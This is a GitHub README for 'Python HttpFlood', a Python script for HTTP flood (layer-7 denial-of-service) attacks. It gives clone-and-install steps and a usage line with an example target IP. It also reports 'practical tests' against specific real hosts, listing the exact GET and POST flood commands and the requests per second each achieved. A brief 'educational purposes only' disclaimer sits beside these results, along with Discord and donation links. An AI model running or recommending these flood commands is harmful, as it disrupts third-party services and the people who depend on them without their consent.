# Python HttpFlood [![Views](https://hits.sh/github.com/e43bpyflooden/hits.svg)](https://github.com/e43b/Python-HttpFlood/)

###### [![](img/en-flag.svg) English](README.md) | [![](img/br.png) Português](README-pt.md)

This is a simple HTTP Flood script developed in Python.

## Installation
```sh
git clone https://github.com/e43b/Python-HttpFlood/
cd Python-HttpFlood
pip install -r requirements.txt  
```

## Usage 
```sh
python main.py <target> <GET/POST> <threads>
Example: python main.py http://51.159.30.249 POST 1500
```

**Note: This script should only be used for educational purposes. It is not recommended or ethical to use this script on sites without permission.**

## Machine Setup and Testing
The script was run on a virtual machine with the following specifications:
- CPU: 1 core
- RAM: 2GB
- Internet Speed: Download: 378.87 Mbit/s, Upload: 48.47 Mbit/s (measured with speedtest-cli)

## Test Configuration
Tests were conducted on different sites to evaluate performance at layer 7 (L7 Non Protected and L7 Non Protected SSL).

### Practical Tests with POST Method
#### Site: https://dstat.cc/l7?id=MULTACOM-CORPORATION
![MULTACOM-CORPORATION](dstat/142post.png)
Command: `python main.py http://142.171.195.145/HIT POST 500`
- Requests per second:
  - Maximum: 1500
  - Average: 1000

#### Site: https://dstat.cc/l7ssl?id=FDCservers-1
![FDCservers-1](dstat/nodecpost.png)
Command: `python main.py https://nodec.mediathektv.com POST 700`
- Requests per second:
  - Maximum: 2800
  - Average: 1500

### Practical Tests with GET Method
#### Site: https://dstat.cc/l7?id=MULTACOM-CORPORATION
![MULTACOM-CORPORATION](dstat/142get.png)
Command: `python main.py http://142.171.195.145/HIT GET 500`
- Requests per second:
  - Maximum: 3000
  - Average: 1000

#### Site: https://dstat.cc/l7ssl?id=FDCservers-1
![FDCservers-1](dstat/nodecget.png)
Command: `python main.py https://nodec.mediathektv.com GET 700`
- Requests per second:
  - Maximum: 2200
  - Average: 1500

## Author
The creator of this tool is [E43b](https://github.com/e43b/).

- **Discord:** [Server](https://discord.gg/CsBMMXBz7t)
- **Donation:** [Donation Link](https://oxapay.com/donate/40874860)
